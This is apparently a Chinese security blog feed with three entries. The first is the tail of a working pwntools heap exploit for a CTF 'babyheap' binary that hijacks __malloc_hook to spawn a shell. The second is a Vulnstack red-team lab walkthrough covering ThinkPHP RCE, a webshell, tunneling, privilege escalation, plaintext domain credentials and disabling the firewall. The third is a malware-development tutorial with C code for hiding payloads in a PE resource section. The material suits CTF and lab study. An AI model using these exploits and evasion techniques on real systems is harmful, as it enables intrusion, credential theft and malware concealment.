class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token string">b'bbbb'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>__free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>__malloc_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">)</span>__realloc_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>target<span class="token operator">=</span>__malloc_hook<span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token number">5</span>lg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span>target<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">b'x'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf03a4</span><span class="token punctuation">,</span><span class="token number">0xf1247</span><span class="token punctuation">]</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'realloc'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">11</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'How much do you want'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv0xf03a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL || &#123;[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...&#125; is a valid argv0xf1247 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv'''</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./babyheap'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-5</title>
      <link href="/2024/11/21/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-5/"/>
      <url>/2024/11/21/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">漏洞详情</a></p></blockquote><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>只有两台机子，一个外网一个内网</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">win7sun\leo 123.comsun\Administrator dc123.com2008sun\admin 2020.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>win7启动phpstudy<br><img src="/Rxi134_FILE/37514640ca23b85c2139045439df833e_MD5.jpeg"></p><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/Rxi134_FILE/bdc549cfcccaed50166046dc8a75eec1_MD5.jpeg"></p><h2 id="TP-tp5-construct-code-exec-1"><a href="#TP-tp5-construct-code-exec-1" class="headerlink" title="TP tp5_construct_code_exec_1"></a>TP tp5_construct_code_exec_1</h2><p>访问一下，一眼thinkphp<br><img src="/Rxi134_FILE/6a6fb455a71f3d0f7cb37dee1e0b7590_MD5.jpeg"></p><p>制造报错看下版本<br><img src="/Rxi134_FILE/4e90583701c7118f8126ee670d283af8_MD5.jpeg"></p><p>工具直接梭哈，命令无回显，挂个webshell<br><img src="/Rxi134_FILE/0ebd4784751b05b3d16fa72b9a1a8405_MD5.jpeg"><br><img src="/Rxi134_FILE/e8118b28dc98ebd577aa1926ea22166d_MD5.jpeg"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>不是还有mysql吗，翻翻配置文件<br><img src="/Rxi134_FILE/a27437b3184c8bf057378695e642578e_MD5.jpeg"></p><h2 id="搭建socks隧道"><a href="#搭建socks隧道" class="headerlink" title="搭建socks隧道"></a>搭建socks隧道</h2><p>chisel失败，ew可以</p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>内网 ip 为 192.168.138.136，内网网段为 192.168.138.0&#x2F;24</p><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\phpStudy\PHPTutorial\WWW\public> systeminfo主机名:           WIN7OS 名称:          Microsoft Windows 7 专业版 OS 版本:          6.1.7601 Service Pack 1 Build 7601OS 制造商:        Microsoft CorporationOS 配置:          成员工作站OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:       产品 ID:          00371-177-0000061-85581初始安装日期:     2020/3/5, 0:44:56系统启动时间:     2024/11/21, 15:14:49系统制造商:       VMware, Inc.系统型号:         VMware Virtual Platform系统类型:         x64-based PC处理器:           安装了 1 个处理器。                  [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 MhzBIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh-cn;中文(中国)输入法区域设置:   zh-cn;中文(中国)时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     2,047 MB可用的物理内存:   1,310 MB虚拟内存: 最大值: 4,095 MB虚拟内存: 可用:   3,168 MB虚拟内存: 使用中: 927 MB页面文件位置:     C:\pagefile.sys域:               sun.com登录服务器:       暂缺修补程序:         安装了 3 个修补程序。                  [01]: KB2534111                  [02]: KB2999226                  [03]: KB976902网卡:             安装了 3 个 NIC。                  [01]: Intel(R) PRO/1000 MT Network Connection                      连接名:      wk1 waiwang                      启用 DHCP:   是                      DHCP 服务器: 192.168.74.254                      IP 地址                        [01]: 192.168.74.160                        [02]: fe80::42a:7d55:e4d9:8eff                  [02]: Bluetooth 设备(个人区域网)                      连接名:      Bluetooth 网络连接                      状态:        媒体连接已中断                  [03]: Intel(R) PRO/1000 MT Network Connection                      连接名:      本地连接                      启用 DHCP:   否                      IP 地址                        [01]: 192.168.138.136                        [02]: fe80::38d3:8142:9a7e:bb5f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>域名 sun.com </p><p><img src="/Rxi134_FILE/fc299f05da8c84da0b0b383a7a32d6e6_MD5.jpeg"></p><p>administrator 不在域中<br><img src="/Rxi134_FILE/c935093ae5dcf2defb190e0d818f8eab_MD5.jpeg"></p><h2 id="提权至SYSTEM"><a href="#提权至SYSTEM" class="headerlink" title="提权至SYSTEM"></a>提权至SYSTEM</h2><p>CS：<br>token窃取可以直接提权，getsystem直接梭<br><img src="/Rxi134_FILE/743bc3f1526bfa6a151d604539160589_MD5.jpeg"></p><h2 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">sun\administrator:dc123.comsun\leo:123.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>顺带进程注入到sun\leo</p><p><img src="/Rxi134_FILE/794a140928413875ea907ded1bd88157_MD5.jpeg"></p><h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><p><img src="/Rxi134_FILE/99aba2d4399562f7e9bcea3f9c03056c_MD5.jpeg"></p><p>用了一个魔改版的成功了<br><img src="/Rxi134_FILE/1562489a511af1ebb2e99073430d0b26_MD5.jpeg"></p><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msf exe没上线成功，用exe-small正连<br><img src="/Rxi134_FILE/685f5d6a9482e44b95b89ae6f2ad048c_MD5.jpeg"></p><h2 id="拿下DC"><a href="#拿下DC" class="headerlink" title="拿下DC"></a>拿下DC</h2><p>有了域管的账号实际已经是可以为所欲为了，后面省略</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15.Payload Placement - .rsrc Section 有效负载放置</title>
      <link href="/2024/11/20/15.Payload%20Placement%20-%20.rsrc%20Section%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%94%BE%E7%BD%AE/"/>
      <url>/2024/11/20/15.Payload%20Placement%20-%20.rsrc%20Section%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%94%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>将有效负载存储在 <code>.rsrc</code> 部分是一个非常好的选择，因为大多数实际的二进制文件都将它们的数据保存在这里。对于恶意软件作者来说，这也是一种更清晰的方法，因为较大的有效负载无法存储在 <code>.text</code> 或 <code>.data</code> 等部分中，因为它们有大小限制，这会导致在编译时 Visual Studio 出现错误。</p><p>例如，你的程序要生成一个exe文件，而文件的图标是你自定义的图标。你就要在这个工程里面添加Icon资源，添加一个外部的ico文件，保存到.rc里面，因此可以直接调用图标文件。</p><h1 id="rsrc-部分"><a href="#rsrc-部分" class="headerlink" title=".rsrc 部分"></a>.rsrc 部分</h1><p>以下步骤说明了如何将有效负载存储在 .rsrc 部分：</p><ol><li><p>在 Visual Studio 中，右键点击 ‘资源文件’，然后点击 添加 &gt; 新项。<br><img src="/Rxi134_FILE/88b39d76c3df4ee2d1f8c0edcb6bdd41_MD5.jpeg"></p></li><li><p>点击“资源文件”<br><img src="/Rxi134_FILE/a571851f25fefa5c067c0b032dfb1468_MD5.jpeg"></p></li><li><p>这将生成一个新的侧边栏，即资源视图。右键点击 <code>.rc</code> 文件（默认名称为 Resource.rc），然后选择 <strong>添加资源</strong> 选项。<br><img src="/Rxi134_FILE/ff6099a04cb0de581f9261e3abc6301b_MD5.jpeg"></p></li><li><p>点击 ‘导入’.<br><img src="/Rxi134_FILE/5774dcc6b25edccecbda14e6b840d132_MD5.jpeg"></p></li><li><p>选择 calc.ico 文件，它是重命名为扩展名 ..ico 的原始有效负载<br><img src="/Rxi134_FILE/07c919f5a20a71be52d69939824158e3_MD5.jpeg"></p></li><li><p>将出现一条提示，要求输入资源类型。输入不带引号的“RCDATA”。<br><img src="/Rxi134_FILE/0e1d8c86241e1617c36d2ab0fb80d571_MD5.jpeg"></p></li><li><p>单击“确定”后，有效负载应在 Visual Studio 项目中以原始二进制格式显示<br><img src="/Rxi134_FILE/dfe9c7a161f65b0223b10f4ded2a654b_MD5.jpeg"></p></li><li><p>退出资源视图时，“resource.h”头文件应该可见，并根据步骤 2 中的 .rc 文件命名。该文件包含一个定义语句，引用资源部分中有效负载的 ID (IDR_RCDATA1) 。这对于稍后能够从资源部分检索有效负载非常重要。<br><img src="/Rxi134_FILE/1fd5fe0ddbec8973a08c837d8e570f79_MD5.jpeg"></p></li></ol><hr><p>编译后，有效负载现在将存储在该部分中，但无法直接访问。相反，必须使用多个 WinAPI 来访问 .rsrc</p><ul><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew">FindResourceW</a> - 获取存储在资源部分的指定数据的位置，该数据由传入的特殊 ID 指定（在头文件中定义）。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource</a> - 检索资源数据的句柄。此句柄可用于获取指定资源在内存中的基地址。返回类型为 <strong>HGLOBAL</strong>。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource">LockResource</a> - 从指定资源句柄中获取指向资源部分数据的指针。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource">SizeofResource</a> - 获取资源部分中指定数据的大小。</p></li></ul><p>下面的代码片段将利用上述 Windows API 来访问资源部分，并获取有效载荷的地址和大小：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"resource.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>HRSRChRsrc                   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>HGLOBALhGlobal                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PVOIDpPayloadAddress         <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>SIZE_TsPayloadSize            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">// 获取存储在 .rsrc 中的数据位置，通过其 ID *IDR_RCDATA1*</span>hRsrc <span class="token operator">=</span> <span class="token function">FindResourceW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCEW</span><span class="token punctuation">(</span>IDR_RCDATA1<span class="token punctuation">)</span><span class="token punctuation">,</span> RT_RCDATA<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hRsrc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] FindResourceW 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 HGLOBAL，即指定资源数据的句柄，稍后需要调用 LockResource</span>hGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hGlobal <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] LoadResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 .rsrc 部分中有效载荷的地址</span>pPayloadAddress <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>hGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pPayloadAddress <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] LockResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 .rsrc 部分中有效载荷的大小</span>sPayloadSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sPayloadSize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] SizeofResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 打印指针和大小到屏幕上</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] pPayloadAddress 变量: 0x%p \n"</span><span class="token punctuation">,</span> pPayloadAddress<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] sPayloadSize 变量: %ld \n"</span><span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[#] 按 &lt;Enter> 键退出..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译并运行上述代码后，有效载荷的地址及其大小将被打印到屏幕上。需要注意的是，这个地址位于资源部分，该部分是只读内存，任何尝试在其中修改或编辑数据的操作都将导致访问冲突错误。如果要编辑有效载荷，必须分配一个与有效载荷大小相同的缓冲区，并将数据复制到该缓冲区。所有的修改（如解密有效载荷）都应在这个新缓冲区中进行。</p><h1 id="更新-rsrc-Payload"><a href="#更新-rsrc-Payload" class="headerlink" title="更新 .rsrc Payload"></a>更新 .rsrc Payload</h1><p>由于有效载荷不能直接从资源部分进行编辑，因此必须将其移动到一个临时缓冲区。为此，可以使用 <code>HeapAlloc</code> 